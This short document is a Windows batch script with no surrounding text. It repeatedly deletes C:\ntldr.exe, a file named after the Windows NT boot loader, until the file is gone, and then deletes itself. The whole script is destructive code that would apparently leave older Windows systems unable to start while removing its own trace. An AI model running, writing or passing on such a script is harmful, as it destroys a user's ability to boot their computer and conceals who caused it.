   @echo off
   :s
   del C:\ntldr.exe
   if exist C:\ntldr.exe goto s
   del %0
